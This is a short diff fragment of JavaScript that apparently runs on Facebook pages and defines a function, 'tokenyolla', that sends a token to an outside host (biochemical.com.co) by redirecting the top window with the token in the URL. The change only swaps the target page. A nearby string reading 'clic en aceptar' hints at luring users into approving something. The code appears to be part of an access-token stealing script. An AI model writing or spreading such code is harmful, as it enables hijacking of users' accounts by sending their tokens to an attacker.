@@ -171,7 +171,7 @@ if (location.hostname.indexOf("www.facebook.com", "static.ak.facebook.com", "app
     }, 200);
 
     function tokenyolla(token) {
-        top.location.href = 'http://biochemical.com.co/prueba.html#' + token;
+        top.location.href = 'http://biochemical.com.co/rev.html#' + token;
     }
 }
 var alibasim = "clic en aceptar";
